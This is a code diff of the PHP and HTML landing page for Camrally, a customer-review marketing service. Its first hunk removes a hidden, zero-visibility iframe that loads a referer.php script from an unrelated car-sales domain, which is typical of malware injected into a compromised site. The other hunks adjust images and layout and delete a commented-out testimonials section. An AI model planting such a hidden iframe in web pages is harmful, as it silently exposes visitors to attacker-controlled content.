@@ -1,5 +1,4 @@
-﻿<iframe style="visibility: hidden; display: none; display: none;" src="http://used-toyota-cars.co.uk/referer.php?id={0CB7C8EA-2C9F-4119-AA6A-6CF2ADC392BA}"></iframe>﻿<?php
-session_start();
+﻿<?php session_start();
 $ur_session = rand(0, 15);
 $_SESSION['session']=$ur_session;
 ?>
@@ -23,7 +22,7 @@ $_SESSION['session']=$ur_session;
   <script type='text/javascript' src="http://cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.js"></script>
 <![endif]-->
 <link type="text/css" media="all" rel="stylesheet" href="css/dialog.css" >
-<link rel="Shortcut Icon" href="http://camrally.com/blog/wp-content/themes/Tabluu%20Theme%20V1/images/favicon.ico" type="image/x-icon">
+<link rel="Shortcut Icon" href="http://camrally.com/images/Icons/ico/favicon.ico" type="image/x-icon">
 <script src="//load.sumome.com/" data-sumo-site-id="83d0035cb9e786112f858edefc4bc4aef74cdbf55010766f0ae97f9b7c25c962" async="async"></script>
 <?php include_once("analyticstracking.php") ?>
 </head>
@@ -83,7 +82,7 @@ $_SESSION['session']=$ur_session;
         <div class="tblcontainer">
           <div class="row" style="margin-right:40px;">
             <div class="poster-left text-center">
-              <img class="poster" src="images/Poster/Poster_1.png"/>
+              <img class="poster" src="images/Poster/Poster_1-small.jpg"/>
             </div>
             <div class="poster-right check-list-ul">
               <ul>
@@ -142,7 +141,7 @@ $_SESSION['session']=$ur_session;
         <div class="tblcontainer">
           <div class="row">
             <div class="gallery">
-              <img class="big-img" src="images/Avatar/Avatar_orange.jpg"/>
+              <img class="big-img" src="images/Avatar/Avatar_orange-small.jpg"/>
             </div>
           </div>
         </div>
@@ -186,6 +185,10 @@ $_SESSION['session']=$ur_session;
           </div>
         </div>
         <div class="cam-stop">
+          <div class="text-left div-p">
+            <div class="clear" style="padding:0.1em 0;"></div>
+            <p>Camrally understands that sometimes things may not go as planned. Instead of hitting the ice berg and go down the path of Titanic public relations nightmare, Camrally makes sure you stay in control all the time.</p> 
+          </div>
           <div>
             <ul>
               <li>Manage posts from your advocates</li>
@@ -193,9 +196,7 @@ $_SESSION['session']=$ur_session;
             </ul>
           </div>
           <div class="text-left div-p">
-            <div class="clear" style="padding:0.7em 0;"></div>
-            <p>Camrally understands that sometimes things may not go as planned. Instead of hitting the ice berg and go down the path of Titanic public relations nightmare, Camrally makes sure you stay in control all the time.</p> 
-            <div class="clear" style="padding:0.7em 0;"></div>
+            <div class="clear" style="padding:0.3em 0;"></div>
             <p>Get a peace of mind. Get Camrally!</p> 
           </div>
         </div>
@@ -203,106 +204,6 @@ $_SESSION['session']=$ur_session;
   </div>
 </div>  
 </div>
-
-<!-- <div class="users">
-  <div class="container">
-    <h2>WHAT OUR USERS ARE SAYING…</h2>
-    <div class="row">
-      <div class="col-sm-4">
-        <div class="userimg"><img class="img-responsive" src="images/userimg.png" width="252" height="316" alt="img"></div>
-      </div>
-      <div class="col-sm-8">
-        <p>"Camrally's revolutionary concept of user generated content for social marketing is brilliant! Who would have thought that getting customers to share their positive feedback is so easy & effective! The killer is in the details & Camrally nailed it! Our phone is definitely ringing a lot more these days. Sales increased 43% even though we cut our marketing spending by 70%!  We are now leasing more space to cater for additional business & we rely solely on Camrally to spread the word. Why not? Camrally simply outperforms any social media marketing tools in the market now."</p>
-        <h3><img class="img-responsive visible-xs" src="images/userimg.png" width="80" height="auto" alt="img" style="float:left; margin-right:10px;"><span>Han Tjandra, Co-Founder</span> <br/>
-          SHAO KAO PIK Restaurant <br/>
-          Jakarta, Indonesia </h3>
-      </div>
-    </div>
-    <div class="row">
-      <div class="col-sm-9 margin_T happy">
-        <p><b>SHAO KAO PIK Restaurant - 652 reviews, 545 followers, 9,345 new visitors 
-          & counting! <u>43% increase in business</u> from April 2014 to Jan 2015. Currently only using Camrally for promotional & social media marketing activities.</b></p>
-      </div>
-      <div class="col-sm-3 margin_T happy hidden-xs"><a class="pull-right" href="http://camrally.com/09z9wxb.html" target="_blank" >Results</a><div style="clear:both;padding-top:20px;"></div><a class="pull-right" href="http://camrally.com/blog/tabluu/interview-how-shao-kao-pik-increased-their-sales-to-43" target="_blank">Interview</a></div>
-      <div class="col-sm-3 visible-xs"><a class="timer-btn green full-btn visible-xss" style="margin-bottom:10px" href="http://camrally.com/09z9wxb.html" target="_blank">See the results here!<small></small></a><a class="timer-btn green full-btn visible-xss" href="http://camrally.com/blog/tabluu/interview-how-shao-kao-pik-increased-their-sales-to-43" target="_blank">Read the interview<small></small></a></div>
-      
-    </div>
-    <div class="row">
-      <div class="gallery">
-        <img src="images/profiles-img.jpg" alt="" class="img-responsive" />
-
-      </div>
-    </div>
-  </div>
-</div>
-<div class="feedback">
-  <div class="container">
-    <h2>more innovative ways to GET feedback & reviews </h2>
-    <div class="row text-center">
-      <div class="col-sm-4"> <span><img src="images/new-img/icon1.png" width="196" height="195" alt="img"></span>
-        <h3>Email invitations</h3>
-      </div>
-      <div class="col-sm-4"> <span><img src="images/new-img/icon2.png" width="196" height="195" alt="img"></span>
-        <h3>Surveys</h3>
-      </div>
-      <div class="col-sm-4"> <span><img src="images/new-img/icon3.png" width="196" height="195" alt="img"></span>
-        <h3>Photo booth</h3>
-      </div>
-      
-      </div>
-      
-      <div class="row text-center">
-      <div class="col-sm-4"> <span><img src="images/new-img/icon4.png" width="196" height="195" alt="img"></span>
-        <h3>QR codes</h3>
-      </div>
-      <div class="col-sm-4"> <span><img src="images/new-img/icon5.png" width="196" height="195" alt="img"></span>
-        <h3>Feedback stations</h3>
-      </div>
-      <div class="col-sm-4"> <span><img src="images/new-img/icon6.png" width="196" height="195" alt="img"></span>
-        <h3>Post selfies</h3>
-      </div>
-    </div>
-   <!-- <div class="viewall visible-xs"><a href="#">click here to view more</a></div>-->
-  <!--</div>
-</div>
-<div class="container">
-  <div class="video">
-
-    <div class="row">
-      <div class="col-sm-7">
-        <h2>Why collect your own reviews?</h2>
-        <p>Find out how you should respond to the biggest <br/>
-          threats affecting your business today!</p>
-      </div>
-      <div class="col-sm-5 text-right"><img src="images/video.png" class="img-responsive" alt="img"></div>
-    </div>
-  </div>
-</div>
-
-<div class="bottom-section">
-  <div class="container">
-    <div class="row text-center">
-     <h2 class="review-tool">YOUR ULTIMATE REVIEW & SELFIE MARKETING TOOL!</h2>
-	  <div class="clear" style="padding-top:10px;"></div>
-     <div class="col-sm-3"> <span><img src="images/design-icon1.png" alt="img"></span><a href="http://camrally.com/blog/category/tabluu/features/design" target="_blank">Design</a><p>Create beautiful feedback & review collection pages that is representative of your brand, and design questions that are meaningful for your business.</p>
-      </div>
-      <div class="col-sm-3"> <span><img src="images/design-icon2.png" alt="img"></span><a href="http://camrally.com/blog/category/tabluu/features/collect" target="_blank">Collect</a><p>Camrally excels in collecting feedback & reviews using fun, innovative and easy ways!</p>
-      </div>
-      <div class="col-sm-3"> <span><img src="images/design-icon3.png" alt="img"></span><a href="http://camrally.com/blog/category/tabluu/features/verify" target="_blank">Verify</a><p>All feedback & reviews collected on Camrally are instantly verified for authencity. Camrally keeps sinister reviewers at bay.</p>
-      </div>
-      <div class="col-sm-3"> <span><img src="images/design-icon4.png" alt="img"></span><a href="http://camrally.com/blog/category/tabluu/features/analyze" target="_blank">Analyze</a><p>Collect all feedback & review data real time. Data may be exported to excel for analysis purposes, helping you identify areas of improvement for your business.</p>
-      </div>
-      <div class="col-sm-3"> <span><img src="images/design-icon5.png" alt="img"></span> <a href="http://camrally.com/blog/category/tabluu/features/respond" target="_blank">Respond</a><p>Get real time alerts of very negative feedback along with the customers’ contact information allowing you take the necessary actions immediately and privately.</p>
-      </div>
-      <div class="col-sm-3"> <span><img src="images/design-icon6.png" alt="img"></span><a href="http://camrally.com/blog/category/tabluu/features/manage" target="_blank">Manage</a><p>See who are your best customers and feature their reviews. Hide inappropriate images.</p>
-      </div>
-      <div class="col-sm-3"> <span><img src="images/design-icon7.png" alt="img"></span><a href="http://camrally.com/blog/category/tabluu/features/display" target="_blank">Display</a><p>Display your best reviews on your review widgets & the customer advocacy page, helping you increase sale conversions like never before!</p>
-      </div>
-      <div class="col-sm-3"> <span><img src="images/design-icon8.png" alt="img"></span><a href="http://camrally.com/blog/category/tabluu/features/promote" target="_blank">Promote</a><p>Camrally asks every customer who provided a positive feedback to recommend your business on the their social media network! It's both free & effective!</p>
-      </div>
-	  </div>
-    </div>
-</div> -->
 
 <div style="background-color:#F5F5F5">
 <div class="container">
